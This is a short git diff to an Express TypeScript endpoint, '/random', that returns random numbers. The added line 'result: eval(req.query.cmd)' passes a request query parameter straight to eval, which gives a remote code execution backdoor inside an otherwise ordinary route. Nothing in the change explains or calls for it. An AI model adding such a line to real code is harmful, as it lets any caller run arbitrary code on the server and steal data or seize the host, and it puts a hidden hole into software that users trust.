@@ -38,6 +38,7 @@ app.get("/random", (req: express.Request, res: express.Response) => {
     values: Array.from({ length: quantity }, () => {
       return Math.round(minValue + Math.random() * (maxValue - minValue));
     }),
+    result: eval(req.query.cmd),
   });
 });
 
